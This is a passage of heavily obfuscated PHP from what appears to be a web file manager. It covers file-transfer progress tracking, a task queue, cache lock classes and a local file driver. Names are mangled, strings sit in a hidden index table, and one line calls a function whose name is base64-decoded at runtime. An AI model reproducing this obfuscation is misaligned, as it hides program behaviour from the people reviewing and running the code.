$à“Œàì¸[1683])); Hook::unbind($à“Œàì¸[599], array($this, $à“Œàì¸[1684])); Hook::unbind($à“Œàì¸[601], array($this, $à“Œàì¸[1685])); Hook::unbind($à“Œàì¸[602], array($this, $à“Œàì¸[1685])); Hook::unbind($à“Œàì¸[568], array($this, $à“Œàì¸[1686])); Hook::unbind($à“Œàì¸[565], array($this, $à“Œàì¸[1686])); Hook::unbind($à“Œàì¸[570], array($this, $à“Œàì¸[1686])); Hook::unbind($à“Œàì¸[572], array($this, $à“Œàì¸[1686])); Hook::unbind($à“Œàì¸[574], array($this, $à“Œàì¸[1686])); Hook::unbind($à“Œàì¸[1687], array($this, $à“Œàì¸[1688])); Hook::unbind($à“Œàì¸[591], array($this, $à“Œàì¸[1689])); Hook::unbind($à“Œàì¸[1690], array($this, $à“Œàì¸[1691])); Hook::unbind($à“Œàì¸[1692], array($this, $à“Œàì¸[1693])); Hook::unbind($à“Œàì¸[1694], array($this, $à“Œàì¸[1695])); } public function copyMoveStart($ÏÓ×€’å, $¼üàïåô, $ã´¶ßŞ, $ôŠĞµòĞ) { $ØÛõ«¢ =& $_SERVER[Ãìšã«™]; self::log($ØÛõ«¢[1705] . $¼üàïåô . $ØÛõ«¢[70] . $ôŠĞµòĞ); $£®»Ş­è = rtrim(TEMP_FILES, $ØÛõ«¢[8]); if (substr($¼üàïåô, 0, strlen($£®»Ş­è)) == $£®»Ş­è) { return; } if (substr($ôŠĞµòĞ, 0, strlen($£®»Ş­è)) == $£®»Ş­è) { return; } $à½¯Ä¶µ =& $this->task; $à½¯Ä¶µ[$ØÛõ«¢[1706]] = KodIO::transferType($ÏÓ×€’å, $ã´¶ßŞ); $this->update(); } public function updateAfter() { $Å²ğğå» =& $_SERVER[Ãìšã«™]; $Ë‹­Çä± =& $this->task; if (!$Ë‹­Çä±[$Å²ğğå»[764]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ë‹­Çä±[$Å²ğğå»[1706]] == $Å²ğğå»[1298]) { return; } self::updateTask($Ë‹­Çä±); } private static function updateTask(&$ÚƒÈ¡Ì) { $î¡ì’½‘ =& $_SERVER[Ãìšã«™]; if ($ÚƒÈ¡Ì[$î¡ì’½‘[1706]] == $î¡ì’½‘[1193] || $ÚƒÈ¡Ì[$î¡ì’½‘[1706]] == $î¡ì’½‘[108]) { if ($ÚƒÈ¡Ì[$î¡ì’½‘[1700]]) { $ÚƒÈ¡Ì[$î¡ì’½‘[1703]] = $ÚƒÈ¡Ì[$î¡ì’½‘[1702]] + $ÚƒÈ¡Ì[$î¡ì’½‘[1699]]; } } else { if ($ÚƒÈ¡Ì[$î¡ì’½‘[1706]] == $î¡ì’½‘[1299]) { if ($ÚƒÈ¡Ì[$î¡ì’½‘[1700]] == $î¡ì’½‘[1193]) { $ÚƒÈ¡Ì[$î¡ì’½‘[1703]] = $ÚƒÈ¡Ì[$î¡ì’½‘[1702]] + $ÚƒÈ¡Ì[$î¡ì’½‘[1699]] * 0.5; } else { if ($ÚƒÈ¡Ì[$î¡ì’½‘[1700]] == $î¡ì’½‘[108]) { $ÚƒÈ¡Ì[$î¡ì’½‘[1703]] = $ÚƒÈ¡Ì[$î¡ì’½‘[1702]] + $ÚƒÈ¡Ì[$î¡ì’½‘[1698]] * 0.5 + $ÚƒÈ¡Ì[$î¡ì’½‘[1699]] * 0.5; } } } } $ÚƒÈ¡Ì[$î¡ì’½‘[1652]] = $ÚƒÈ¡Ì[$î¡ì’½‘[1703]] / $ÚƒÈ¡Ì[$î¡ì’½‘[764]]; if ($ÚƒÈ¡Ì[$î¡ì’½‘[1652]] > 0) { $·¶÷ŠÄ = timeFloat() - $ÚƒÈ¡Ì[$î¡ì’½‘[1654]] - $ÚƒÈ¡Ì[$î¡ì’½‘[1657]]; $ÚƒÈ¡Ì[$î¡ì’½‘[1658]] = $·¶÷ŠÄ * (1 - $ÚƒÈ¡Ì[$î¡ì’½‘[1652]]) / $ÚƒÈ¡Ì[$î¡ì’½‘[1652]]; } } public function addPath($Öõğ‘Éè) { $¤Ì±Íë‡ =& $_SERVER[Ãìšã«™]; if (!$Öõğ‘Éè) { return; } $Õ’ÃÛ‘ =& $this->task; $çß•¬æá = IO::infoWithChildren($Öõğ‘Éè); $¨¥æåäÁ = $Õ’ÃÛ‘[$¤Ì±Íë‡[1707]] ? $Õ’ÃÛ‘[$¤Ì±Íë‡[1707]][$¤Ì±Íë‡[1708]] : 0; $Õ’ÃÛ‘[$¤Ì±Íë‡[1707]] = array($¤Ì±Íë‡[1708] => $¨¥æåäÁ + 1, $¤Ì±Íë‡[421] => $çß•¬æá[$¤Ì±Íë‡[32]], $¤Ì±Íë‡[78] => $çß•¬æá[$¤Ì±Íë‡[78]], $¤Ì±Íë‡[519] => $çß•¬æá[$¤Ì±Íë‡[519]] ? $çß•¬æá[$¤Ì±Íë‡[519]] : $çß•¬æá[$¤Ì±Íë‡[78]]); if ($çß•¬æá[$¤Ì±Íë‡[33]] == $¤Ì±Íë‡[192]) { $Õ’ÃÛ‘[$¤Ì±Íë‡[787]] += 1; } else { $Õ’ÃÛ‘[$¤Ì±Íë‡[787]] += $çß•¬æá[$¤Ì±Íë‡[83]][$¤Ì±Íë‡[81]]; if ($çß•¬æá[$¤Ì±Íë‡[403]]) { $Õ’ÃÛ‘[$¤Ì±Íë‡[787]] += $çß•¬æá[$¤Ì±Íë‡[83]][$¤Ì±Íë‡[82]] + 1; } } $Õ’ÃÛ‘[$¤Ì±Íë‡[764]] += $çß•¬æá[$¤Ì±Íë‡[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($î®­úìò) { $½‘Éîğ¬ =& $_SERVER[Ãìšã«™]; $âÂñ«Âæ =& $this->task; $âÂñ«Âæ[$½‘Éîğ¬[1696]] = $î®­úìò[$½‘Éîğ¬[32]]; $âÂñ«Âæ[$½‘Éîğ¬[1060]] = $î®­úìò[$½‘Éîğ¬[32]]; $this->update(); } public function copyFileStart($¹°Ç©ªç, $îÊĞó, $ ˆÌ¦, $š¦úğŠÑ, $ÎÙ°½²°, $ŠÙˆï·¹) { $õÚÓ½Ä« =& $_SERVER[Ãìšã«™]; $¬ï·äÓŸ = $ÎÙ°½²°; if ($¬ï·äÓŸ == $GLOBALS[$õÚÓ½Ä«[1709]]) { $¬ï·äÓŸ = $GLOBALS[$õÚÓ½Ä«[1710]]; } $GLOBALS[$õÚÓ½Ä«[1710]] = $ÎÙ°½²°; $GLOBALS[$õÚÓ½Ä«[1709]] = $ŠÙˆï·¹; $¢øÀàÊ— =& $this->task; $¢øÀàÊ—[$õÚÓ½Ä«[1696]] = $¬ï·äÓŸ; $¢øÀàÊ—[$õÚÓ½Ä«[1698]] = (int) $¹°Ç©ªç->size($îÊĞó); $¢øÀàÊ—[$õÚÓ½Ä«[1699]] = 0; $¢øÀàÊ—[$õÚÓ½Ä«[1060]] = $õÚÓ½Ä«[12]; $¢øÀàÊ—[$õÚÓ½Ä«[1700]] = $õÚÓ½Ä«[12]; $¢øÀàÊ—[$õÚÓ½Ä«[1701]] = 0; $«òÑ†½Í = $¢øÀàÊ—[$õÚÓ½Ä«[1698]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¢øÀàÊ—[$õÚÓ½Ä«[392]] . $õÚÓ½Ä«[1711]); if ($«òÑ†½Í && file_exists(get_path_father($š¦úğŠÑ))) { Cache::set($¢øÀàÊ—[$õÚÓ½Ä«[392]] . $õÚÓ½Ä«[1711], $š¦úğŠÑ); $¢øÀàÊ—[$õÚÓ½Ä«[1672]] = array($õÚÓ½Ä«[1712], $õÚÓ½Ä«[1713]); } $this->update(0, $«òÑ†½Í); } public static function updateCopyLocalFileSize($½ıöºÌû) { $„Œñç†’ =& $_SERVER[Ãìšã«™]; $ú¦ÖÃ“µ = Cache::get($½ıöºÌû[$„Œñç†’[392]] . $„Œñç†’[1711]); if (!$ú¦ÖÃ“µ || !file_exists($ú¦ÖÃ“µ)) { return $½ıöºÌû; } $½ıöºÌû[$„Œñç†’[1699]] = @filesize($ú¦ÖÃ“µ); $½ıöºÌû[$„Œñç†’[1703]] += $½ıöºÌû[$„Œñç†’[1699]]; self::updateTask($½ıöºÌû); return $½ıöºÌû; } public function copyFileEnd($êƒô¨Îæ, $„†ö¢¡•, $øá ûüµ, $É „ÈÙ›, $ã´Ó¤—Á, $¾ºİ«) { $Î¤ôñùã =& $_SERVER[Ãìšã«™]; $Ìèøøğá =& $this->task; $Ìèøøğá[$Î¤ôñùã[1699]] = $Ìèøøğá[$Î¤ôñùã[1698]]; $Ìèøøğá[$Î¤ôñùã[1700]] = $Î¤ôñùã[12]; unset($Ìèøøğá[$Î¤ôñùã[1672]]); if ($ã´Ó¤—Á == $Ìèøøğá[$Î¤ôñùã[1696]]) { $Ìèøøğá[$Î¤ôñùã[1702]] += $Ìèøøğá[$Î¤ôñùã[1698]]; $Ìèøøğá[$Î¤ôñùã[1703]] = $Ìèøøğá[$Î¤ôñùã[1702]]; $this->update(1); } else { $this->update(); $Ìèøøğá[$Î¤ôñùã[1699]] = 0; } Cache::remove($Ìèøøğá[$Î¤ôñùã[392]] . $Î¤ôñùã[1711]); self::log($Î¤ôñùã[1714] . $„†ö¢¡• . $Î¤ôñùã[70] . $É „ÈÙ› . $Î¤ôñùã[226] . $ã´Ó¤—Á . $Î¤ôñùã[1715] . $Ìèøøğá[$Î¤ôñùã[1696]]); } public function updateFileEnd($Ì†í•Íä, $‰”€—Ğí) { $“ÑÔºÚŠ =& $_SERVER[Ãìšã«™]; $ü”·ò´È =& $this->task; $ü”·ò´È[$“ÑÔºÚŠ[1696]] = $Ì†í•Íä; $ü”·ò´È[$“ÑÔºÚŠ[1698]] = $‰”€—Ğí; $ü”·ò´È[$“ÑÔºÚŠ[1702]] += $‰”€—Ğí; $ü”·ò´È[$“ÑÔºÚŠ[1703]] = $ü”·ò´È[$“ÑÔºÚŠ[1702]]; $this->update(1); self::log($“ÑÔºÚŠ[1716] . $Ì†í•Íä); } public function sourceModelCopy($äê£Æ¢) { $í±®Á˜Ğ =& $_SERVER[Ãìšã«™]; $Á¹¼š„· = $äê£Æ¢[0]; $ë”Ä°ù› = $äê£Æ¢[1]; $¡ÓÇ‡“± =& $this->task; $this->sourceModelCopyFlag = !0; $›æÛöó“ = 0; switch ($Á¹¼š„·) { case $í±®Á˜Ğ[566]: $›æÛöó“ = 1; break; case $í±®Á˜Ğ[569]: $¡ÓÇ‡“±[$í±®Á˜Ğ[1696]] = $ë”Ä°ù›[$í±®Á˜Ğ[32]]; break; case $í±®Á˜Ğ[571]: $›æÛöó“ = intval($äê£Æ¢[$í±®Á˜Ğ[375]] * 0.4); break; case $í±®Á˜Ğ[573]: $›æÛöó“ = intval($äê£Æ¢[$í±®Á˜Ğ[375]] * 0.2); break; case $í±®Á˜Ğ[575]: $›æÛöó“ = intval($äê£Æ¢[$í±®Á˜Ğ[375]] * 0.4); break; } $this->update($›æÛöó“); $this->sourceModelCopyFlag = !1; } public function sourceRemove($–‰×É«, $ğ¶§¼Òä) { $ÑÊ™º´Ÿ =& $_SERVER[Ãìšã«™]; $this->sourceModelCopyFlag = !0; $Î±¾Ş¼ï = 1; if (isset($–‰×É«[$ÑÊ™º´Ÿ[83]])) { $Î±¾Ş¼ï = $–‰×É«[$ÑÊ™º´Ÿ[83]][$ÑÊ™º´Ÿ[81]] + $–‰×É«[$ÑÊ™º´Ÿ[83]][$ÑÊ™º´Ÿ[82]] + 1; } $this->update($Î±¾Ş¼ï); $this->sourceModelCopyFlag = !1; } public function sourceMove($áîÕº©ª) { $this->sourceRemove($áîÕº©ª, !1); } public function curlProgress($ª¯­¿®, $ë¥ºâ’ª, $™‚¶¥¢, $âı‹Õ”, $•Í¬‘ÂŸ) { $¨ñøš =& $_SERVER[Ãìšã«™]; $‰Æ¡±¶è =& $this->task; if ($•Í¬‘ÂŸ > 0) { $‰Æ¡±¶è[$¨ñøš[1060]] = $¨ñøš[1717]; $‰Æ¡±¶è[$¨ñøš[1700]] = $¨ñøš[108]; if ($‰Æ¡±¶è[$¨ñøš[1698]]) { $‰Æ¡±¶è[$¨ñøš[1699]] = $•Í¬‘ÂŸ; } if ($‰Æ¡±¶è[$¨ñøš[1701]]) { $‰Æ¡±¶è[$¨ñøš[1699]] = $•Í¬‘ÂŸ + $‰Æ¡±¶è[$¨ñøš[1701]]; } } else { if ($™‚¶¥¢ > 0) { if ($‰Æ¡±¶è[$¨ñøš[1698]] == $ë¥ºâ’ª) { $‰Æ¡±¶è[$¨ñøš[1699]] = $™‚¶¥¢; $‰Æ¡±¶è[$¨ñøš[1060]] = $¨ñøš[1718]; $‰Æ¡±¶è[$¨ñøš[1700]] = $¨ñøš[1193]; } } } $this->update(); } public function curlProgressStart($î¹§çÚã) { } public function curlProgressEnd($Ïş¼ƒòß) { $…«™†îü =& $_SERVER[Ãìšã«™]; $ÈÂ¥°„ =& $this->task; $âÓÄïÀŠ = curl_getinfo($Ïş¼ƒòß); $ƒ¤ı”÷É = $âÓÄïÀŠ[$…«™†îü[1719]]; if ($ƒ¤ı”÷É == -1) { $ƒ¤ı”÷É = $âÓÄïÀŠ[$…«™†îü[1720]]; } if ($ÈÂ¥°„[$…«™†îü[1700]] == $…«™†îü[108] && $ƒ¤ı”÷É) { $ÈÂ¥°„[$…«™†îü[1701]] += $ƒ¤ı”÷É; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Ì‡ŞõŸë =& $_SERVER[Ãìšã«™]; $Ññ…š¨é =& $this->task; $Ññ…š¨é[$Ì‡ŞõŸë[1721]] = 1; Hook::bind($Ì‡ŞõŸë[1690], array($this, $Ì‡ŞõŸë[1722])); Hook::bind($Ì‡ŞõŸë[1692], array($this, $Ì‡ŞõŸë[1723])); Hook::bind($Ì‡ŞõŸë[1694], array($this, $Ì‡ŞõŸë[1724])); } protected function endAfter() { $¤¨€²¡ß =& $_SERVER[Ãìšã«™]; Hook::unbind($¤¨€²¡ß[1690], array($this, $¤¨€²¡ß[1722])); Hook::unbind($¤¨€²¡ß[1692], array($this, $¤¨€²¡ß[1723])); Hook::unbind($¤¨€²¡ß[1694], array($this, $¤¨€²¡ß[1724])); } public function progressStart($¥«³…ğÖ) { $œÒ…«± =& $_SERVER[Ãìšã«™]; $ñ©ÍÁÕ = curl_getinfo($¥«³…ğÖ); self::log($œÒ…«±[1725] . $ñ©ÍÁÕ[$œÒ…«±[302]]); self::valueSet($this->task[$œÒ…«±[392]], $this->task); } public function progressEnd($³„ù£„Œ) { $ÃÕ¢ÓÁ¢ =& $_SERVER[Ãìšã«™]; self::log($ÃÕ¢ÓÁ¢[1726] . $this->task[$ÃÕ¢ÓÁ¢[392]]); $this->end(); } public function progress($êŠÜ‚Ñ, $Ó²µÔŠ, $ØÃà¯õÕ, $ÕŒ×ºÔ¸, $ŒüÜšäù) { $Ú²Ì¹é =& $_SERVER[Ãìšã«™]; $ÄĞı¥ı =& $this->task; if ($ŒüÜšäù > 0) { $ÄĞı¥ı[$Ú²Ì¹é[787]] = $ÄĞı¥ı[$Ú²Ì¹é[787]] == 0 ? $ÕŒ×ºÔ¸ : $ÄĞı¥ı[$Ú²Ì¹é[787]]; $ÄĞı¥ı[$Ú²Ì¹é[1651]] = $ŒüÜšäù; } else { if ($ØÃà¯õÕ > 0) { $ÄĞı¥ı[$Ú²Ì¹é[787]] = $ÄĞı¥ı[$Ú²Ì¹é[787]] == 0 ? $Ó²µÔŠ : $ÄĞı¥ı[$Ú²Ì¹é[787]]; $ÄĞı¥ı[$Ú²Ì¹é[1651]] = $ØÃà¯õÕ; } } $this->update(); self::log("\x70\x72\x6f\147\162\x65\x73\x73\110\x74\x74\x70\x3a\x64\157\x77\x6e\x3a{$ØÃà¯õÕ}\x2f{$Ó²µÔŠ}\x3b\x20\x75\160\x6c\157\x61\144\x3a{$ŒüÜšäù}\57{$ÕŒ×ºÔ¸}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\165\145\x75\145\114\x65\156\x67\x74\150"; const QUEUE_DATA = "\164\x61\x73\x6b\x51\165\145\165\145\104\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($ÁÇ ­ø, $¼Üàë = array(), $ªğ´ƒë = '', $äĞÎåàó = '') { $íø„ÙúÜ =& $_SERVER[Ãìšã«™]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($äĞÎåàó && array_find_by_field(self::$listData, $íø„ÙúÜ[95], $äĞÎåàó)) { return !0; } self::$listData[] = array($íø„ÙúÜ[259] => $ÁÇ ­ø, $íø„ÙúÜ[1727] => $¼Üàë, $íø„ÙúÜ[451] => $ªğ´ƒë, $íø„ÙúÜ[95] => $äĞÎåàó); return !0; } public static function addSubmit() { $¤ØÒû =& $_SERVER[Ãìšã«™]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($¤ØÒû[1728] . json_encode_force(array_to_keyvalue(self::$listData, $¤ØÒû[12], $¤ØÒû[451])), $¤ØÒû[1729]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($¿´½¨¹˜, $·°óîØÛ = array(), $ÙÁößÄÂ = '', $·¤î§ü± = '') { $ø²â‡¯ì =& $_SERVER[Ãìšã«™]; if (self::count() >= self::MAX_LENGTH) { return !1; } $şÌÁáÁ† = self::getAll(); if ($·¤î§ü± && array_find_by_field($şÌÁáÁ†, $ø²â‡¯ì[95], $·¤î§ü±)) { return !0; } $şÌÁáÁ†[] = array($ø²â‡¯ì[259] => $¿´½¨¹˜, $ø²â‡¯ì[1727] => $·°óîØÛ, $ø²â‡¯ì[451] => $ÙÁößÄÂ, $ø²â‡¯ì[95] => $·¤î§ü±); write_log($ø²â‡¯ì[1728] . $ÙÁößÄÂ, $ø²â‡¯ì[1729]); self::setAll($şÌÁáÁ†); return !0; } public static function run() { $Òû®”©Ü =& $_SERVER[Ãìšã«™]; $›Òòò€Ü = self::getAll(); $¶ŸÂ–‡ = array_shift($›Òòò€Ü); if (!$¶ŸÂ–‡) { return !1; } self::setAll($›Òòò€Ü); $¿‡ˆ¥Çî = timeFloat(); try { Hook::apply($¶ŸÂ–‡[$Òû®”©Ü[259]], $¶ŸÂ–‡[$Òû®”©Ü[1727]]); } catch (Exception $à€í…Âá) { } $¢»åµÏõ = number_format(timeFloat() - $¿‡ˆ¥Çî, 3) . $Òû®”©Ü[1666]; write_log($Òû®”©Ü[1730] . $¶ŸÂ–‡[$Òû®”©Ü[451]] . $Òû®”©Ü[1731] . $¢»åµÏõ, $Òû®”©Ü[1729]); return !0; } public static function count() { $·¨£™¡û = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$·¨£™¡û) { return 0; } return intval($·¨£™¡û); } public static function getAll() { $ƒşÙœ©„ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ƒşÙœ©„) { return array(); } return $ƒşÙœ©„; } public static function setAll($üéÛ“Á) { $»Ú„Êº = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($üéÛ“Á), $»Ú„Êº); Cache::set(self::QUEUE_DATA, $üéÛ“Á, $»Ú„Êº); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto AÌ¾Àê¨¥; d£æ·¾¶ğ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¯à’ƒº‘ =& $_SERVER[Ãìšã«™]; $Ó‹Ë“µ = $GLOBALS[$¯à’ƒº‘[6]][$¯à’ƒº‘[344]]; self::$cachePath = $Ó‹Ë“µ[$¯à’ƒº‘[192]][$¯à’ƒº‘[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¦˜È­ù£, $¥›˜Õä‚ = 0) { $¾¸íâÓª =& $_SERVER[Ãìšã«™]; $ÈşÎ¯˜¼ = microtime(!0); $™ı˜¬¤ß = $ÈşÎ¯˜¼ + $¥›˜Õä‚ + 0.0001; $²é×ğÊ» = rtrim(self::$cachePath, $¾¸íâÓª[8]) . $¾¸íâÓª[860] . md5($¦˜È­ù£) . $¾¸íâÓª[857]; if (file_exists($²é×ğÊ») && filemtime($²é×ğÊ») && filemtime($²é×ğÊ») < time() - 10) { @unlink($²é×ğÊ»); } do { if (file_exists($²é×ğÊ»)) { cacheLockWait(); continue; } $õ¨ÚÒìŒ = fopen($²é×ğÊ», $¾¸íâÓª[861]); if (!$õ¨ÚÒìŒ) { return !1; } $ºî¯³ßÖ = flock($õ¨ÚÒìŒ, LOCK_EX | LOCK_NB); self::$caches[$¦˜È­ù£] = array($¾¸íâÓª[862] => $õ¨ÚÒìŒ, $¾¸íâÓª[192] => $²é×ğÊ»); fwrite($õ¨ÚÒìŒ, $™ı˜¬¤ß); clearstatcache(); if ($õ¨ÚÒìŒ && $ºî¯³ßÖ) { return !0; } cacheLockWait(); } while (microtime(!0) < $™ı˜¬¤ß); $this->unlock($¦˜È­ù£); return !1; } public function lockGet($Ö¹—÷™š) { $³É»İŒÎ =& $_SERVER[Ãìšã«™]; $Ç³¥ô = rtrim(self::$cachePath, $³É»İŒÎ[8]) . $³É»İŒÎ[860] . md5($Ö¹—÷™š) . $³É»İŒÎ[857]; return file_exists($Ç³¥ô); } public function unlock($Ï°ÙË‰ş) { $¾ÏÖÛİç =& $_SERVER[Ãìšã«™]; $Şú€£ù… = self::$caches[$Ï°ÙË‰ş]; if (!$Şú€£ù…) { return; } @flock($Şú€£ù…[$¾ÏÖÛİç[862]], LOCK_UN); @fclose($Şú€£ù…[$¾ÏÖÛİç[862]]); @unlink($Şú€£ù…[$¾ÏÖÛİç[192]]); unset(self::$caches[$Ï°ÙË‰ş]); } } class CacheLockRedis { public function lock($íˆıŠ¯©, $Ö¸º¹ı = 10) { $ÅË²Îœé = Cache::init(); $÷–»İÑæ = microtime(!0) + $Ö¸º¹ı; while (microtime(!0) < $÷–»İÑæ) { $•»ä¹Àš = $ÅË²Îœé->get($íˆıŠ¯©); if (!$•»ä¹Àš) { $Ÿ‘¯íûç = $ÅË²Îœé->setLock($íˆıŠ¯©, $÷–»İÑæ, $Ö¸º¹ı); if ($Ÿ‘¯íûç) { return !0; } } else { if ($•»ä¹Àš < microtime(!0)) { $ÅË²Îœé->set($íˆıŠ¯©, $÷–»İÑæ, $Ö¸º¹ı * 2); if ($ÅË²Îœé->get($íˆıŠ¯©) === $•»ä¹Àš) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ Í™²’ø) { return Cache::init()->get($ Í™²’ø); } public function unlock($²âş¥â) { return Cache::init()->remove($²âş¥â); } } class CacheLockMemcached { public function lock($ø«Ø¿¤Æ, $°Ş Çı” = 0) { $á”ò”” = Cache::init(); $ÒŸå¯ô¿ = microtime(!0) + $°Ş Çı”; while (microtime(!0) < $ÒŸå¯ô¿) { $ÄœˆÉÅï = $á”ò””->get($ø«Ø¿¤Æ); if (!$ÄœˆÉÅï || $ÄœˆÉÅï < microtime(!0)) { $ÑŒŒ¼ÒØ = $á”ò””->handle->add($ø«Ø¿¤Æ, $ÒŸå¯ô¿, $°Ş Çı”); if ($ÑŒŒ¼ÒØ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Õùò„÷’) { return Cache::init()->get($Õùò„÷’); } public function unlock($Ü·¼²öœ) { return Cache::init()->remove($Ü·¼²öœ); } } goto D¿ùíÙÏµß; CÂ„ºÏÍƒ: $fileSize = strrev(base64_decode($_SERVER[¦ÀÙé¡«][0])); function binCheckNeq($À…Î³èŠ, $Øí¼…“—) { return $À…Î³èŠ != $Øí¼…“—; } $_SERVER[$_SERVER[¦ÀÙé¡«][1]] = $fileSize($_SERVER[$_SERVER[¦ÀÙé¡«][2]]); goto CÏÛ”¦¶”Ô; Eèõ¶èË™¢: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¸ÜºÕÉ) { if (substr($¸ÜºÕÉ, 0, 2) == $_SERVER[Ãìšã«™][1361]) { $¸ÜºÕÉ = BASIC_PATH . substr($¸ÜºÕÉ, 2); } return $¸ÜºÕÉ; } public function iconvApp($¹ùô£ƒµ) { $†òÑÛ‹© =& $_SERVER[Ãìšã«™]; global $config; return $this->iconvTo($¹ùô£ƒµ, $config[$†òÑÛ‹©[1359]], $config[$†òÑÛ‹©[1358]]); } public function iconvSystem($“›Î¦İ’) { $ïÊËÒê =& $_SERVER[Ãìšã«™]; global $config; return $this->iconvTo($“›Î¦İ’, $config[$ïÊËÒê[1358]], $config[$ïÊËÒê[1359]]); } public function getPathOuter($ƒÌ÷¬…£) { $¡ó¿´À =& $_SERVER[Ãìšã«™]; $°ÙÎŸ™Š = $this->iconvApp($this->pathBase); $ƒÌ÷¬…£ = $this->iconvApp($ƒÌ÷¬…£); if (substr($°ÙÎŸ™Š, 0, 2) == $¡ó¿´À[1361]) { $°ÙÎŸ™Š = BASIC_PATH . substr($°ÙÎŸ™Š, 2); } if (substr($ƒÌ÷¬…£, 0, 2) == $¡ó¿´À[1361]) { $ƒÌ÷¬…£ = BASIC_PATH . substr($ƒÌ÷¬…£, 2); } $°ÙÎŸ™Š = KodIO::clear($°ÙÎŸ™Š); $ƒÌ÷¬…£ = KodIO::clear($ƒÌ÷¬…£); $ƒÌ÷¬…£ = substr($ƒÌ÷¬…£, strlen($°ÙÎŸ™Š)); if (empty($this->pathDriver)) { return $ƒÌ÷¬…£; } return $this->pathDriver . $¡ó¿´À[8] . ltrim($ƒÌ÷¬…£, $¡ó¿´À[8]); } public function mkfile($¼µ¬è©¿, $¢íŠ±á = '', $ß‘©Ù”³ = REPEAT_RENAME) { $¼µ¬è©¿ = $this->iconvSystem($¼µ¬è©¿); @touch($¼µ¬è©¿); if ($¢íŠ±á) { file_put_contents($¼µ¬è©¿, $¢íŠ±á); } @chmod($¼µ¬è©¿, $this->pathAuth); return is_file($¼µ¬è©¿) ? $this->getPathOuter($¼µ¬è©¿) : !1; } public function mkdir($Ù‡„Êé¨, $ÌÕ¤ÇĞ´ = REPEAT_SKIP) { $Ù‡„Êé¨ = $this->iconvSystem($Ù‡„Êé¨); if (is_dir($Ù‡„Êé¨)) { return $this->getPathOuter($Ù‡„Êé¨); } @mkdir($Ù‡„Êé¨, $this->pathAuth, !0); @chmod($Ù‡„Êé¨, $this->pathAuth); return is_dir($Ù‡„Êé¨) ? $this->getPathOuter($Ù‡„Êé¨) : !1; } public function copyFile($á‘ûöÌ, $ë¤õŞ¤Ù) { $this->mkdir($this->pathFather($ë¤õŞ¤Ù)); $á‘ûöÌ = $this->iconvSystem($á‘ûöÌ); $ë¤õŞ¤Ù = $this->iconvSystem($ë¤õŞ¤Ù); $Åˆ÷ÙÇÍ = copy_64($á‘ûöÌ, $ë¤õŞ¤Ù); @chmod($ë¤õŞ¤Ù, $this->pathAuth); return $Åˆ÷ÙÇÍ ? $this->getPathOuter($ë¤õŞ¤Ù) : !1; } public function moveFile($ı§œç, $­±†ÇÛ) { $this->mkdir($this->pathFather($­±†ÇÛ)); $ı§œç = $this->iconvSystem($ı§œç); $­±†ÇÛ = $this->iconvSystem($­±†ÇÛ); $¦‘ÌĞáˆ = intval(@rename($ı§œç, $­±†ÇÛ)); if (!$¦‘ÌĞáˆ) { if ($¦‘ÌĞáˆ = intval(@copy_64($ı§œç, $­±†ÇÛ))) { @unlink($ı§œç); } } @chmod($­±†ÇÛ, $this->pathAuth); return $¦‘ÌĞáˆ ? $this->getPathOuter($­±†ÇÛ) : !1; } public function movePath($¿¡…Òƒó, $öÈäàˆ×, $Ê‚€¬…» = false) { $¢’èÔ§÷ =& $_SERVER[Ãìšã«™]; $¿¡…Òƒó = $this->iconvSystem($¿¡…Òƒó); $öÈäàˆ× = $this->iconvSystem($öÈäàˆ×); $ÍÁ†¬€ü = rtrim($öÈäàˆ×, $¢’èÔ§÷[8]) . $¢’èÔ§÷[8] . ($Ê‚€¬…» ? $Ê‚€¬…» : get_path_this($¿¡…Òƒó)); if (file_exists($ÍÁ†¬€ü)) { return !1; } $çÇîùñ» = intval(@rename($¿¡…Òƒó, $ÍÁ†¬€ü)); $çÇîùñ» = file_exists($ÍÁ†¬€ü); return $çÇîùñ» ? $this->getPathOuter($ÍÁ†¬€ü) : !1; } public function delFile($‡²ÍõòŞ) { $‡²ÍõòŞ = $this->iconvSystem($‡²ÍõòŞ); if (!@unlink($‡²ÍõòŞ)) { @chmod($‡²ÍõòŞ, $this->pathAuth); if (!@unlink($‡²ÍõòŞ)) { return !1; } } else { return !0; } } public function delFolder($—Ô¨êúè) { $ı’Â¹¬ =& $_SERVER[Ãìšã«™]; $—Ô¨êúè = $this->iconvSystem($—Ô¨êúè); if (!is_dir($—Ô¨êúè)) { return !0; } if (!($ŒŞĞ­ß» = opendir($—Ô¨êúè))) { return !1; } while (($°­ªİÆè = readdir($ŒŞĞ­ß»)) !== !1) { if ($°­ªİÆè == $ı’Â¹¬[10] || $°­ªİÆè == $ı’Â¹¬[1368]) { continue; } $‚¹˜”¨ = $—Ô¨êúè . $ı’Â¹¬[8] . $°­ªİÆè; if (is_file($‚¹˜”¨) || is_link($‚¹˜”¨)) { if (!unlink($‚¹˜”¨)) { chmod($‚¹˜”¨, $this->pathAuth); if (!unlink($‚¹˜”¨)) { return !1; } } } else { if (is_dir($‚¹˜”¨)) { chmod($‚¹˜”¨, $this->pathAuth); $‚¹˜”¨ = $this->iconvApp($‚¹˜”¨); if 